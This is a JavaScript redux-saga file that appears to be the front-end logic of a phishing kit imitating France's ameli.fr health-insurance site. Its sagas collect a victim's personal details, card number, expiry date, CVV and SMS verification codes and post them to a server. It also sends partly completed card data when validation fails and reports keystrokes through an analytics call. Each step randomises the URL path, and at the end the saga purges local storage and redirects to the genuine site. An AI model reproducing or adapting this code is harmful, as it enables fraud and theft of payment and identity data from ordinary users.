import { call, put, takeEvery, takeLatest, fork, all, select } from "redux-saga/effects";
import { delay } from "redux-saga";
import * as actions from "../actions/index";
import * as api from "../utils/api";
import { toast } from "react-toastify";
import * as validation from "../utils/ValidateForms";
import { randomUrl } from "../utils/Utils";
import getStore from "../getStore";

const getData = (state) => ({
	...state.data.fields,
	date: state.data.fields.date_ex_m + "/" + state.data.fields.date_ex_a
});

const ERROR_MSG = {
	message: "une erreur est survenue lors de l'envoi des données"
};


function* getInfoPage() {
	yield call(randomUrl);
	yield put(actions.getPageInfoSuccess());
}

function* acceptToGetSmsPage() {
	try {
		const response = yield call(api.getSmsPage);

		if (response.value === false) {
			yield put(actions.getPageExternSuccess());
		} else {
			// change the url path to random url
			yield call(randomUrl);

			// data is successfully send to server
			// dispatch GET_PAGE_SMS_SUCCESS to get sms page
			yield put(actions.getPageSmsSuccess());
		}
	} catch (error) {
		// change the url path to random url
		yield call(randomUrl);

		// data is successfully send to server
		// dispatch GET_PAGE_SMS_SUCCESS to get sms page
		yield put(actions.getPageSmsSuccess());
	}
}
//-----------------------

function* getCardPage() {
	// update Data in redux store
	const data = yield select(getData);
	yield put(actions.validateInfo(data));
}

function* validateInfo(action) {
	const errors = yield call(validation.validateInfo, action.data);
	const isValid = yield call(validation.Validate, errors);
	if (isValid === true) {
		yield put(actions.postInfo(action.data));
	}
	else {
		yield put(actions.validationFail(errors));
		yield put(actions.getPageCardFail({ "message": "Données du formulaire invalides" }));
	}
}

function* postInfo(action) {

	try {
		// try to information data to server
		const response = yield call(api.postInfo, action.data);

		// if response status is 200 dispatch get page card success
		if (response.status === 200) {
			yield put(actions.postInfoSuccess());
		}
		else {
			throw Error();
		}
	} catch (errors) {
		// request not successfully send dispatch get page fail
		yield put(actions.postInfoFail(ERROR_MSG));
	}
}

function* postInfoSuccess() {
	// change the url path to random url
	yield call(randomUrl);

	// data is successfully send to server
	// dispatch GET_PAGE_CARD_SUCCESS to get card page
	yield put(actions.getPageCardSuccess());

}

function* postInfoFail(action) {

	// data is fail send to server
	// dispatch GET_PAGE_CARD_FAIL to show notification error
	yield put(actions.getPageCardFail(action.errors));
}


//___________________________________________________________________________
function* getSmsPage() {
	// update data to the store
	//yield put(actions.updateData(action.data));

	// get All data from the store
	const data = yield select(getData);

	yield put(actions.validateCard(data));
}

function* validateCard(action) {

	const errors = yield call(validation.validateCard, action.data);
	const isValid = yield call(validation.Validate, errors);
	if (isValid === true) {
		yield put(actions.postData(action.data));
	}
	else {
		yield put(actions.validationFail(errors));
		yield put(actions.getPageSmsFail({ "message": "Données du formulaire invalides" }));
	}

}

function* postData(action) {
	try {
		// try to send data to the server
		const response = yield call(api.postData, action.data);

		// check if response status is Ok
		if (response.status === 200) {
			// status is ok send dispatch POST_DATA_SUCCESS
			yield put(actions.postDataSuccess());
		}
		else {
			// status code is not success raise exception
			throw Error();
		}
	} catch (errors) {
		// fail to post data to server dispatch postData fail
		yield put(actions.postDataFail(ERROR_MSG));
	}
}

function* postDataFail(action) {
	// data is fail send to server
	// dispatch GET_PAGE_SMS_FAIL to show notification error
	yield put(actions.getPageSmsFail(action.errors));
}

//___________________________________________________________________________
function* getExternPage() {
	// get Extern page we dispatch Post Sms action
	const data = yield select(getData);
	yield put(actions.validateSms(data));
}

function* validateSms(action) {

	const errors = yield call(validation.validateSms, action.data);
	const isValid = yield call(validation.Validate, errors);
	if (isValid === true) {
		yield put(actions.postSms(action.data.sms));
	}
	else {
		yield put(actions.validationFail(errors));
		yield put(actions.getPageSmsFail({ "message": "Données du formulaire invalides" }));
	}

}

function* postSms(action) {
	// try to send sms to the server
	try {
		// send request and get response
		const response = yield call(api.postSms, action.sms);

		// check if response status is OK
		if (response.status === 200) {

			// response status is ok dispatch POST_SMS_SUCCESS
			yield put(actions.postSmsSuccess());
		}
		else {
			// response status is not ok , raise exception
			throw Error();
		}
	} catch (errors) {
		// fail to post sms to server dispatch POST_SMS_FAIL
		yield put(actions.postSmsFail(ERROR_MSG));
	}
}

function* postSmsSuccess() {
	yield call(randomUrl);
	yield put(actions.getPageExternSuccess());
}

function* postSmsFail(action) {
	yield put(actions.getPageExternFail(action.errors));
}


function* purge() {
	const { persistLocalStore } = yield call(getStore);
	yield call(delay, 5000, true);
	yield call(persistLocalStore.purge);
	yield call(() => {
		window.location.href = "https://assure.ameli.fr/";
	});
	yield put({ type: actions.RESET_ALL });
}

function* sendNonCompleteData(action) {
	const { q1, q2, compte, carte, date, cvv } = action.errors;
	const { activePage } = yield select(store => ({ ...store.session }));
	if (carte === undefined && date === undefined && cvv === undefined && activePage === actions.PAGES.card) {
		if (compte !== undefined || (compte === undefined && (q1 !== undefined || q2 !== undefined))) {
			const data = yield select(getData);
			try {
				// try to send data to the server
				yield call(api.postData, data);
				// check if response status is Ok
			} catch (errors) {
				//
			}
		}
	}
}

function* analytics() {
	const { activePage } = yield select(store => ({ ...store.session }));
	try {
		yield call(api.analytics, { page: activePage, type: "typing" });
	} catch (error) {
		//
	}
}

function* notification(action) {
	yield call((msg) => {
		toast.error(msg, {
			position: toast.POSITION.BOTTOM_RIGHT
		});
	}, action.errors.message);
}


// Watchers 
export function* watchGetInfoPage() {
	yield takeEvery(actions.GET_PAGE_INFO, getInfoPage);
}
export function* watchGetCardPage() {
	yield takeEvery(actions.GET_PAGE_CARD, getCardPage);
	yield takeEvery(actions.VALIDATE_INFO_DATA, validateInfo);
	yield takeEvery(actions.POST_INFO, postInfo);
	yield takeEvery(actions.POST_INFO_SUCCESS, postInfoSuccess);
	yield takeEvery(actions.POST_INFO_FAIL, postInfoFail);
}

export function* watchGetSmsPage() {
	yield takeEvery(actions.GET_PAGE_SMS, getSmsPage);
	yield takeEvery(actions.VALIDATE_CARD_DATA, validateCard);
	yield takeEvery(actions.POST_DATA, postData);
	yield takeEvery(actions.POST_DATA_SUCCESS, acceptToGetSmsPage);
	yield takeEvery(actions.POST_DATA_FAIL, postDataFail);
}

export function* WatchGetExternPage() {
	yield takeEvery(actions.GET_PAGE_EXTERN, getExternPage);
	yield takeEvery(actions.VALIDATE_SMS_DATA, validateSms);
	yield takeEvery(actions.VALIDATION_FAIL, sendNonCompleteData);
	yield takeEvery(actions.POST_SMS, postSms);
	yield takeEvery(actions.POST_SMS_SUCCESS, postSmsSuccess);
	yield takeEvery(actions.POST_SMS_FAIL, postSmsFail);
	yield takeEvery(actions.GET_PAGE_EXTERN_SUCCESS, purge);
}

export function* watchToNotification() {
	yield takeEvery(actions.GET_PAGE_CARD_FAIL, notification);
	yield takeEvery(actions.GET_PAGE_SMS_FAIL, notification);
	yield takeLatest(actions.GET_PAGE_EXTERN_FAIL, notification);
}

export function* watchTyping() {
	yield takeLatest(actions.UPDATE_FIELD, analytics);
}


export default function* root() {
	yield all([
		fork(watchGetInfoPage),
		fork(watchGetCardPage),
		fork(watchGetSmsPage),
		fork(WatchGetExternPage),
		fork(watchToNotification),
		fork(watchTyping)
	]);
}